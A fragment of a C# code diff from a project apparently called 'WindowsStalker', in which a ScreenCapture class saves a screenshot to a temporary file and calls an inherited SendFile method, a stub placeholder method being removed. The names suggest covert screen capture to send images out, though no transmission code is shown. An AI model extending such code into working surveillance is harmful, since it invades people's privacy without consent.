@@ -2,10 +2,11 @@
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
+using WindowsStalker.Properties;
 
 namespace WindowsStalker
 {
-    public class ScreenCapture
+    public class ScreenCapture : FileCapture
     {
         public static void CaptureScreenshot()
         {
@@ -23,15 +24,8 @@ namespace WindowsStalker
                 CopyPixelOperation.SourceCopy);
 
             //TODO hash this
-            bmpScreenshot.Save("Screenshot.png", ImageFormat.Png);
+            bmpScreenshot.Save("tmp.png", ImageFormat.Png);
             SendFile("xd");
-        }
-
-        public static bool SendFile(string tmpFilePath)
-        {
-            //TODO implement
-            Console.WriteLine("screenshot sent");
-            return true;
         }
     }
 }
